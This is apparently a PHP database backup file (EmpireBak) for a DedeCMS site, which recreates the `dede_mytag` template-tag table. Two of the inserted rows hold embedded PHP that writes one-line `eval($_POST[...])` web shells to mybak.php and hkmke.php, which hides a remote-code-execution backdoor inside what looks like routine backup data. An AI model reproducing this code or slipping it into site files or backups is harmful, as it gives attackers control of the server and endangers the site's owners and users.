<?php
require("../../inc/header.php");

/*
		SoftName : EmpireBak Version 2010
		Author   : wm_chief
		Copyright: Powered by www.phome.net
*/

DoSetDbChar('gbk');
E_D("DROP TABLE IF EXISTS `dede_mytag`;");
E_C("CREATE TABLE `dede_mytag` (
  `aid` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `typeid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `tagname` varchar(30) NOT NULL DEFAULT '',
  `timeset` smallint(6) NOT NULL DEFAULT '0',
  `starttime` int(10) unsigned NOT NULL DEFAULT '0',
  `endtime` int(10) unsigned NOT NULL DEFAULT '0',
  `normbody` text,
  `expbody` text,
  PRIMARY KEY (`aid`),
  KEY `tagname` (`tagname`,`typeid`,`timeset`,`endtime`,`starttime`)
) ENGINE=MyISAM AUTO_INCREMENT=19016 DEFAULT CHARSET=gbk");
E_D("replace into `dede_mytag` values('3117','0','','0','0','0','{dede:php}file_put_contents(''mybak.php'',''<?php eval(\$_POST[mybak]);?>'');{/dede:php}',NULL);");
E_D("replace into `dede_mytag` values('2143','0','','0','0','0','{dede:php}file_put_contents(''hkmke.php'',''hkmke<?php eval(\$_POST[hkmke]);?>'');{/dede:php}',NULL);");

require("../../inc/footer.php");
?>
